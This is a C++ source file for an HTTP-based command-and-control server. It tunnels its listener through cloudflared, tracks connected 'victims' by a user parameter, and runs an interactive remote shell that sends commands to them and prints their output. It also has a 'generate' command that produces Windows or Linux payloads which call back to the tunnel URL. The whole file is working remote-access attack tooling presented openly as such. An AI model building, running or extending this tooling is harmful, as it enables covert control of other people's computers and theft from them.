#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <thread>
#include <future>
#include <unordered_map>
#include <string>
#include <unordered_set>
#include <vector>
#include <sstream>
#include <regex>
#include <ifaddrs.h>
#include <cctype>
#include<random>
#include "command.cpp"
#include "PayloadGenerator.cpp"

using namespace std;

int PORT;
int BUFFER_SIZE = 1024;
int CONNECTION_COUNT=10;

unordered_map<string, int> mp;
string user_input;
string cloudflared_url;

void server();
void client_connection(int server_fd);
void serve_client(string endpoint, int server_fd);
string url_decode(const string& request);
void shell(unordered_map<string, int>& mp, int server_fd);
string get_victim(const char* buffer); // Needed Correction

//The below code needs updation or correction//
string get_victim(const char* buffer) {
    string request_line(buffer);

    size_t first_space = request_line.find(' ');
    if (first_space == string::npos) return "";

    size_t second_space = request_line.find(' ', first_space + 1);
    if (second_space == string::npos) return "";

    string path = request_line.substr(first_space + 1, second_space - first_space - 1);

    size_t user_pos = path.find("?user=");
    if (user_pos == string::npos) return "";

    
    string user_value = path.substr(user_pos + 6); 

    size_t amp_pos = user_value.find('&');
    if (amp_pos != string::npos) {
        user_value = user_value.substr(0, amp_pos);
    }

    return user_value;
}


void shell(unordered_map<string, int>& mp, int server_fd) {
    cout << "\n[+] Welcome to Remote Shell Controller\n";
    cout << "    Type 'help' to see available commands.\n\n";

    while (true) {
        string shell_command;
        cout << "[MainShell] > ";
        getline(cin >> ws, shell_command);

        // Parse tokens into vector to keep order
        stringstream ss(shell_command);
        string token;
        vector<string> tokens;
        while (ss >> token) {
            tokens.push_back(token);
        }

        if (shell_command == "help") {
            help();
            cout << endl;
        } else if (shell_command == "banner") {
            banner();
            cout << endl;
        } else if (shell_command == "show shell") {
            show_shell(mp);
            cout << endl;
        } 
        // Command: shell <victim_name>
        else if (tokens.size() == 2 && tokens[0] == "shell") {
            string victim_name = tokens[1];
            if (mp.find(victim_name) != mp.end()) {
                serve_client(victim_name, server_fd);
            } else {
                cout << "\n[-] Victim ID not found.\n\n";
            }
        }
        // Command: generate os=windows or generate os=linux
        else if (tokens.size() == 2 && tokens[0] == "generate") {
            string os_token = tokens[1];
            if (os_token == "os=windows") {
                string payload = payload_generator_windows(cloudflared_url);
                cout << "\n" << payload << "\n" << endl;
            }
            else if (os_token == "os=linux") {
                string payload = payload_generator_linux(cloudflared_url);
                cout << "\n" << payload << "\n" << endl;
            }
            else {
                cout << "OS not found or not supported.\n";
            }
        }
        else if (shell_command == "quit") {
            string command = "sudo kill $(sudo lsof -ti :" + to_string(PORT) + ") 2>&1 &";
            system(command.c_str());
            cout << "\nServer closed..." << endl;
            break;
        }
        else {
            cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
        }
    }
}

string url_decode(const string& request) {
    regex result_regex("Result=([^&\\s]*)");
    smatch matches;

    if (regex_search(request, matches, result_regex)) {
        if (matches.size() > 1) {
            string encoded_value = matches[1].str();
            string decoded;

            for (size_t i = 0; i < encoded_value.size(); ++i) {
                if (encoded_value[i] == '%' && i + 2 < encoded_value.size()) {
                    int hex_value;
                    istringstream hex_stream(encoded_value.substr(i + 1, 2));
                    hex_stream >> hex >> hex_value;
                    decoded += static_cast<char>(hex_value);
                    i += 2;
                } else if (encoded_value[i] == '+') {
                    decoded += ' ';
                } else {
                    decoded += encoded_value[i];
                }
            }
            return decoded;
        }
    }
    return "";
}


void serve_client(string endpoint, int server_fd) {
    bool flag = true;
    bool terminate_client = false;
    string local_user_input;
    mutex input_mutex;
    bool input_ready = false;
    atomic<bool> need_prompt = true; 

    cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
    cout << "    Type 'quit' to return to MainShell.\n\n";

    auto input_func = [&]() {
        cout << "(Shell@" << endpoint << ") > " << flush;
        while (flag) {
          
            if (need_prompt) {

                need_prompt = false;
            }

            string temp_input;
            getline(cin >> ws, temp_input);

            if (temp_input == "exit") {
                cout << "Are you sure you want to terminate the connection?\n";
                char choice;
                while (true) {
                    cout << "(Y/N): ";
                    cin >> choice;
                    cin.ignore();
                    choice = toupper(choice);

                    if (choice == 'Y') {
                        lock_guard<mutex> lock(input_mutex);
                        local_user_input = "exit";
                        input_ready = true;
                        terminate_client = true;
                        flag = false;
                        break;
                    } else if (choice == 'N') {
                        cout <<"(Shell@" << endpoint << ") > " << flush;
                        break;
                    } else {
                        cout << "Invalid choice, please enter Y or N\n";
                    }
                }
            } else if (temp_input == "quit") {
                lock_guard<mutex> lock(input_mutex);
                local_user_input = ""; 
                input_ready = true;
                flag = false;
            } else {
                lock_guard<mutex> lock(input_mutex);
                local_user_input = temp_input;
                input_ready = true;
            }
        }
    };

    auto fut = async(launch::async, input_func);

    while (flag || input_ready) {
        string full_request;

        // Step 1: Read until \r\n\r\n
        while (full_request.find("\r\n\r\n") == string::npos) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);

            if (valread <= 0) {
                close(mp[endpoint]);  
                mp.erase(endpoint);
                flag = false;
                break;
            }

            full_request += string(buffer, valread);
        }

        if (!flag && !input_ready) {
            break;
        }

        size_t content_length_pos = full_request.find("Content-Length:");
        size_t body_start_pos = full_request.find("\r\n\r\n");

        int content_length = 0;
        if (content_length_pos != string::npos && body_start_pos != string::npos) {
            size_t start = content_length_pos + strlen("Content-Length:");
            size_t end = full_request.find("\r\n", start);
            string length_str = full_request.substr(start, end - start);

            try {
                content_length = stoi(length_str);
            } catch (...) {
                content_length = 0;
            }
        }

        string body_data = full_request.substr(body_start_pos + 4);

        while ((int)body_data.length() < content_length) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);

            if (valread <= 0) {
                flag = false;
                break;
            }

            body_data += string(buffer, valread);
        }

        if (!flag && !input_ready) {
            break;
        }

 
        if (full_request.find("POST") != string::npos && full_request.find("ERROR:") == string::npos) {
            string result = url_decode(body_data);

            if (result.size() > 3) {
                result.resize(result.size() - 3);
                cout << result <<"(Shell@" << endpoint << ") > " << flush;
            } else {
                cout << result<<"(Shell@" << endpoint << ") > " << flush;
            }

            // After printing result, force input thread to show prompt again
            need_prompt = true;
        }

        // Step 5: Send response (command), if any
        string body;
        {
            lock_guard<mutex> lock(input_mutex);
            if (input_ready) {
                body = local_user_input;
                input_ready = false;
            }
        }

        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);

        // If terminating client after sending "exit"
        if (terminate_client && body == "exit") {
            close(mp[endpoint]);
            mp.erase(endpoint);
            break;
        }

        // If user selected "quit", just exit serve_client
        if (!flag && !terminate_client) {
            break;
        }
    }

    cout << "\n[+] Exited remote shell of client '" << endpoint << "'\n\n";
}

void client_connection(int server_fd) {
    socklen_t addrlen;
    struct sockaddr_in client_addr;

    while (true) {
        addrlen = sizeof(client_addr);
        int client_conn = accept(server_fd, (struct sockaddr*)&client_addr, &addrlen);
        if (client_conn < 0) {
            perror("Accept failed");
            continue;
        }

        char buffer[BUFFER_SIZE] = {0};
        int valread = read(client_conn, buffer, BUFFER_SIZE - 1);
        
        if (valread <= 0) {
            close(client_conn);
            break;
        }

        string endpoint = get_victim(buffer);
        if (mp.find(endpoint) == mp.end()) {
            cout << "\n====================================\n";
            cout << "  [+] New connection: " << endpoint << "\n";
            cout << "====================================\n\n";
            cout << "[MainShell] > " << flush;
        }

        string body = "";
        mp[endpoint] = client_conn;
        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);
    }
}

void server() {

    int server_fd;
    struct sockaddr_in address, client_addr;
    socklen_t addrlen = sizeof(client_addr);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    address.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Binding failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, CONNECTION_COUNT) < 0) {
        perror("Listening failed");
        exit(EXIT_FAILURE);
    }

    cout << "\n[+] HTTP server running on port " << PORT << "\n\n";

    thread client_thread(client_connection, server_fd);
    client_thread.detach();

    shell(mp, server_fd);

    close(server_fd);
}

int main() {
    
    banner();

    random_device rd;  
    mt19937 gen(rd()); 
    uniform_int_distribution<> dis(1000, 10000);
    PORT = dis(gen);

    cloudflared_url = start_cloudflared(PORT);
    if (cloudflared_url.size() <= 0) {
        cout << "Failed to create tunnel";
        cloudflared_url="http://127.0.0.1:"+to_string(PORT);
    }
    else{
        cout << "Tunnel created successfully" << endl;
    }

    server();
    return 0;
}